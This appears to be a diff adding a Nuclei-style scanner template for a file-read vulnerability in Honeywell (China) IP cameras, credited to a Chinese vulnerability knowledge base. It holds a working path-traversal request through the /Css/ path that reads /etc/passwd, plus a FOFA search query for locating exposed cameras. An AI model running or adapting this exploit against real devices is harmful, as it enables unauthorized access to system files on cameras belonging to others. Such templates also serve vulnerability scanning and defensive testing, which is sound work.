@@ -1,0 +1,19 @@
+id: poc-chmghwefgt13mvfh
+info:
+  name: 霍尼韦尔(中国)有限公司摄像头css存在文件读取
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/chmghwefgt13mvfh'
+  tags: lfi,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: chmghwefgt13mvfh
+    fofa: title=”Honeywell IP camera”
+http:
+- raw:
+  - GET /Css//././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../etc/passwd HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
